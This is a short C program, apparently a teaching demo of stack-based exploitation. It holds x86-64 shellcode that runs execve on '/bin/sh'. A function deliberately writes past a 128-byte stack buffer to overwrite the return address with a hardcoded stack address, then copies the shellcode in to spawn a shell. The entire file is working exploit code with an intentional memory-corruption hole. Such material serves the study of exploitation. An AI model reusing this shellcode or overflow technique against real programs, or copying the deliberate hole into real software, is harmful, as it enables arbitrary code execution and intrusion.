#include <string.h>

char shellcode[] =
    "\xeb\x1f\x5d\x48\x89\x6d\x08\x31\xc0\x89\x45\x10\x89\xc2\xb0\x3b\x48\x8d"
    "\x75\x08\x48\x8b\x7d\x08\x0f\x05\x48\x31\xff\xb0\x3c\x0f\x05\xe8\xdc\xff"
    "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void foo(char *data, unsigned long sz, long idx, long val) {
    char buf[128] = {0};
    long *ret = (long*)(buf + idx);
    *ret = val;
    memcpy(buf, data, sz);
}

int main(void) {
    foo(shellcode, sizeof(shellcode), 152, 0x7fffffffd720);
    return 0;
}
